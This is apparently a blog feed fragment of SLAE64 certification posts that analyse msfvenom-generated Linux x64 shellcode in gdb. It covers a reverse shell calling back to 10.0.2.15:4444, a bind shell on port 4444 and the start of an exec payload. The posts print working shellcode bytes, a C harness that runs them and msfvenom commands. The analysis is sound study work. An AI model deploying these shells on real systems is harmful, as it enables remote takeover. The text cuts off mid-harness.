   0x0000000000601063 &amp;lt;code+3&amp;gt;:  cdq
   0x0000000000601064 &amp;lt;code+4&amp;gt;:  push   0x2
   0x0000000000601066 &amp;lt;code+6&amp;gt;:  pop    rdi
   0x0000000000601067 &amp;lt;code+7&amp;gt;:  push   0x1
   0x0000000000601069 &amp;lt;code+9&amp;gt;:  pop    rsi
   0x000000000060106a &amp;lt;code+10&amp;gt;: syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To make a connection back to the attacker controlled machine, shellcode needs to contain important information like ip and port, in our case this is all displayed to us at offset +14 where hexadecimal value is moved to rcx. What that hexadecimal value &lt;code class=&quot;highlighter-rouge&quot;&gt;0xf02000a5c110002&lt;/code&gt; actually represents can be teared up to following bits:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;0002 - AF_INET, ipv4 address families&lt;/li&gt;
  &lt;li&gt;5c11 - in little endian 115c converted to decimal gives us the port number 4444&lt;/li&gt;
  &lt;li&gt;0x0a00020f is the hexadecimal format of an IP address 10.0.2.15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall has 3 arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/code&gt; we need to prepare the corresponding registers &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;. By pushing &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt; to the stack and then moving it to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; we prepare the 2nd argument. The following &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x10&lt;/code&gt; which we then immediately pop into &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is the overall size of the &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr *addr&lt;/code&gt; structure, which is 16 bytes. And as usual, you can find the syscall number from &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060106c &amp;lt;code+12&amp;gt;: xchg   rdi,rax
   0x000000000060106e &amp;lt;code+14&amp;gt;: movabs rcx,0xf02000a5c110002
   0x0000000000601078 &amp;lt;code+24&amp;gt;: push   rcx
   0x0000000000601079 &amp;lt;code+25&amp;gt;: mov    rsi,rsp
   0x000000000060107c &amp;lt;code+28&amp;gt;: push   0x10
   0x000000000060107e &amp;lt;code+30&amp;gt;: pop    rdx
   0x000000000060107f &amp;lt;code+31&amp;gt;: push   0x2a
   0x0000000000601081 &amp;lt;code+33&amp;gt;: pop    rax
   0x0000000000601082 &amp;lt;code+34&amp;gt;: syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Next we are duplicating file descriptors and as we have seen in the previous post about bind shell, msfvenon generates this part so that it is done in a loop for duplicating stdin-1, stdout-2 and stdout-3.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601084 &amp;lt;code+36&amp;gt;: push   0x3
   0x0000000000601086 &amp;lt;code+38&amp;gt;: pop    rsi
   0x0000000000601087 &amp;lt;code+39&amp;gt;: dec    rsi
   0x000000000060108a &amp;lt;code+42&amp;gt;: push   0x21
   0x000000000060108c &amp;lt;code+44&amp;gt;: pop    rax
   0x000000000060108d &amp;lt;code+45&amp;gt;: syscall
   0x000000000060108f &amp;lt;code+47&amp;gt;: jne    0x601087 &amp;lt;code+39&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and finally the reverse shell launches the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall where &lt;code class=&quot;highlighter-rouge&quot;&gt;0x68732f6e69622f&lt;/code&gt; marks that the program to be launched is &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601091 &amp;lt;code+49&amp;gt;: push   0x3b
   0x0000000000601093 &amp;lt;code+51&amp;gt;: pop    rax
   0x0000000000601094 &amp;lt;code+52&amp;gt;: cdq
   0x0000000000601095 &amp;lt;code+53&amp;gt;: movabs rbx,0x68732f6e69622f
   0x000000000060109f &amp;lt;code+63&amp;gt;: push   rbx
   0x00000000006010a0 &amp;lt;code+64&amp;gt;: mov    rdi,rsp
   0x00000000006010a3 &amp;lt;code+67&amp;gt;: push   rdx
   0x00000000006010a4 &amp;lt;code+68&amp;gt;: push   rdi
   0x00000000006010a5 &amp;lt;code+69&amp;gt;: mov    rsi,rsp
   0x00000000006010a8 &amp;lt;code+72&amp;gt;: syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the whole concept of this shellcode looks pretty much as I have already described in the blog post about &lt;a href=&quot;../../blog/2019-01-25-blog-SLAE2/&quot;&gt;reverse shell&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/bindreverse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 5.3/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 3/3 shellcode analysed in this article is the shell_reverse_tcp payload.</summary></entry><entry><title type="html">Msfvenom generated bind_tcp shellcode analysis</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE52/" rel="alternate" type="text/html" title="Msfvenom generated bind_tcp shellcode analysis" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE52</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE52/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 5.2/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 2/3 shellcode analysed in this article is the shell_bind_tcp payload.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h3 id=&quot;msfvenom-generated-linuxx64shell_bind_tcp-payload&quot;&gt;MSFvenom generated linux/x64/shell_bind_tcp payload&lt;/h3&gt;

&lt;p&gt;As a follow up to analysing &lt;a href=&quot;/blog/2019-05-01-blog-SLAE51&quot;&gt;exec shellcode&lt;/a&gt;, the second payload I chose is the linux/x64/shell_bind_tcp payload. By description, this payload is used to spawn a command shell and listen for a connection. In order to generate the payload I used the following command:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/shell_bind_tcp -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 86 bytes
Final size of c file: 386 bytes
unsigned char buf[] =
&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52&quot;
&quot;\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31&quot;
&quot;\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f&quot;
&quot;\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75&quot;
&quot;\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;
&quot;\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;shellcode-test-program&quot;&gt;Shellcode test program&lt;/h4&gt;

&lt;p&gt;To analyse the generated payload I am placed it into the C program from where we will be executing the shellcode:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52&quot;
&quot;\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31&quot;
&quot;\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f&quot;
&quot;\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75&quot;
&quot;\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;
&quot;\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;

int main()
{
  printf(&quot;Shellcode Length:  %d\n&quot;, (int)strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and finally compiled the C program as follows:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;

&lt;p&gt;Examining the generated shellcode in gdb, shows us that 6 syscalls will be executed, so let’s divide our analysis into 6 separate steps.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/msfvenom_syscalls.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall&lt;/p&gt;

&lt;p&gt;We can see that the 1st syscall is the socket syscall, as &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; is initialized to 0x29 (41). From &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt; syscall man page, we can easily validate that this syscall takes 3 arguments and as a result will return a file descriptor.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; –&amp;gt; 0x2 for AF_INET&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; –&amp;gt; 0x1 for type SOCKSTREAM&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; –&amp;gt; 0x0 for protocol. &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is zeroed out with the cdq instruction&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dump of assembler code from 0x601060 to 0x6010b6:
=&amp;gt; 0x0000000000601060 &amp;lt;code+0&amp;gt;:	push   0x29
   0x0000000000601062 &amp;lt;code+2&amp;gt;:	pop    rax
   0x0000000000601063 &amp;lt;code+3&amp;gt;:	cdq
   0x0000000000601064 &amp;lt;code+4&amp;gt;:	push   0x2
   0x0000000000601066 &amp;lt;code+6&amp;gt;:	pop    rdi
   0x0000000000601067 &amp;lt;code+7&amp;gt;:	push   0x1
   0x0000000000601069 &amp;lt;code+9&amp;gt;:	pop    rsi
   0x000000000060106a &amp;lt;code+10&amp;gt;:	syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall&lt;/p&gt;

&lt;p&gt;The usecase for the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall is to bind to the socket created in step 1. The way to identify the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall here are the 2 lines just before the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction. Value 0x31 is pushed to the stack and then right after, popped to rax, which by convention is where we need to have the syscall number.&lt;/p&gt;

&lt;p&gt;Looking at the layout of a bind ` int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);&lt;code class=&quot;highlighter-rouge&quot;&gt; syscall we can get the most important bits of information for us (ip address and the port) if we understand the &lt;/code&gt;sockaddr *addr&lt;code class=&quot;highlighter-rouge&quot;&gt; structure. By looking at line &lt;/code&gt;mov DWORD PTR [rsp],0x5c110002` we can deduct the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;02 –&amp;gt; AF_INET for ipv4 address family&lt;/li&gt;
  &lt;li&gt;00 –&amp;gt; INADDR_ANY, so it will try to connect to 0.0.0.0&lt;/li&gt;
  &lt;li&gt;5c11 –&amp;gt; is in the network byte order (big endian). Once we change that to little endian 115c and convert it to decimal, we get that the port this shellcode is trying to connect to is 4444&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060106c &amp;lt;code+12&amp;gt;:	xchg   rdi,rax
   0x000000000060106e &amp;lt;code+14&amp;gt;:	push   rdx
   0x000000000060106f &amp;lt;code+15&amp;gt;:	mov    DWORD PTR [rsp],0x5c110002
   0x0000000000601076 &amp;lt;code+22&amp;gt;:	mov    rsi,rsp
   0x0000000000601079 &amp;lt;code+25&amp;gt;:	push   0x10
   0x000000000060107b &amp;lt;code+27&amp;gt;:	pop    rdx
   0x000000000060107c &amp;lt;code+28&amp;gt;:	push   0x31
   0x000000000060107e &amp;lt;code+30&amp;gt;:	pop    rax
   0x000000000060107f &amp;lt;code+31&amp;gt;:	syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; syscall&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; syscall corresponds to 0x32 (50) and by convention is takes 2 arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;int listen(int sockfd, int backlog);&lt;/code&gt; Since &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; is already prepared for us from previous syscalls, all we will see here is the preparation of the syscall value for &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601081 &amp;lt;code+33&amp;gt;:	push   0x32
   0x0000000000601083 &amp;lt;code+35&amp;gt;:	pop    rax
   0x0000000000601084 &amp;lt;code+36&amp;gt;:	syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall&lt;/p&gt;

&lt;p&gt;Once we are listening on the port, the next thing what should happen is some other party initiating a connection. When that happens, shellcode should be able to accept that incoming connection. This is where &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall comes into play.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601086 &amp;lt;code+38&amp;gt;:	xor    rsi,rsi
   0x0000000000601089 &amp;lt;code+41&amp;gt;:	push   0x2b
   0x000000000060108b &amp;lt;code+43&amp;gt;:	pop    rax
   0x000000000060108c &amp;lt;code+44&amp;gt;:	syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;5&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt; goes by the syscall number 0x21 (33) and it takes 2 arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;int dup2(int oldfd, int newfd);&lt;/code&gt;, the old file descriptor in &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; and the new file descriptor in &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;. As we need to apply it for stdin, stdout and stderr, which correspond to the numbers 0,1 and 2, it makes sense to do it in a loop and this is exactly what msfvenom has generated for us. each round &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; is decremented by 1, and then checked in the end of the loop whether or not it has reached to 0.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060108e &amp;lt;code+46&amp;gt;:	xchg   rdi,rax
   0x0000000000601090 &amp;lt;code+48&amp;gt;:	push   0x3
   0x0000000000601092 &amp;lt;code+50&amp;gt;:	pop    rsi
   0x0000000000601093 &amp;lt;code+51&amp;gt;:	dec    rsi
   0x0000000000601096 &amp;lt;code+54&amp;gt;:	push   0x21
   0x0000000000601098 &amp;lt;code+56&amp;gt;:	pop    rax
   0x0000000000601099 &amp;lt;code+57&amp;gt;:	syscall
   0x000000000060109b &amp;lt;code+59&amp;gt;:	jne    0x601093 &amp;lt;code+51&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;6&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; the finale&lt;/p&gt;

&lt;p&gt;This shellcode ends up executing the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt; syscall, which all of us are now way too familiar with from my previous posts, but for the sake of it let’s go through it again :). So &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; goes by the 0x3b (59) syscall number and it takes 3 arguments.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;cdq&lt;/code&gt; allows us conveniently to sign-extend the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; and make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is zeroed out. This is what would hold the environment variables if we wanted to pass any.&lt;/li&gt;
  &lt;li&gt;With instructions at offsets +65, +75 and +76 we place the address with the program name which we want to execute, &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, to &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;with instructions at offsets +79, +80 and +81 we first place the address from &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to the stack again. So we end up with an address at &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; pointing to the address where we have stored string &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. Image addr –&amp;gt; addr –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060109d &amp;lt;code+61&amp;gt;:	push   0x3b
   0x000000000060109f &amp;lt;code+63&amp;gt;:	pop    rax
   0x00000000006010a0 &amp;lt;code+64&amp;gt;:	cdq
   0x00000000006010a1 &amp;lt;code+65&amp;gt;:	movabs rbx,0x68732f6e69622f
   0x00000000006010ab &amp;lt;code+75&amp;gt;:	push   rbx
   0x00000000006010ac &amp;lt;code+76&amp;gt;:	mov    rdi,rsp
   0x00000000006010af &amp;lt;code+79&amp;gt;:	push   rdx
   0x00000000006010b0 &amp;lt;code+80&amp;gt;:	push   rdi
   0x00000000006010b1 &amp;lt;code+81&amp;gt;:	mov    rsi,rsp
   0x00000000006010b4 &amp;lt;code+84&amp;gt;:	syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;To test out the msfvenom generated payload simply run the compiled version of the payload and open another tab to make the connection &lt;code class=&quot;highlighter-rouge&quot;&gt;nc 0.0.0.0 4444&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 5.2/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 2/3 shellcode analysed in this article is the shell_bind_tcp payload.</summary></entry><entry><title type="html">Msfvenom generated Exec shellcode analysis - exec shellcode</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE51/" rel="alternate" type="text/html" title="Msfvenom generated Exec shellcode analysis - exec shellcode" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE51</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE51/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 5.1/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 1/3 shellcode analysed in this article is the linux/x64/exec payload.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h3 id=&quot;msfvenom-generated-linuxx64exec-payload&quot;&gt;MSFvenom generated linux/x64/exec payload&lt;/h3&gt;

&lt;p&gt;The first payload I chose is the linux/x64/exec payload, which is used to execute an arbitrary command which I have specified in the CMD commandline argument. In order to generate the payload I used the following command:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# msfvenom -p linux/x64/exec -f c CMD=whoami
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 46 bytes
Final size of c file: 220 bytes
unsigned char buf[] =
&quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53&quot;
&quot;\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00&quot;
&quot;\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f&quot;
&quot;\x05&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;shellcode-test-program&quot;&gt;Shellcode test program&lt;/h4&gt;

&lt;p&gt;In order to analyse the generated payload I am placing it into the C program where we will be executing the shellcode:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53&quot;
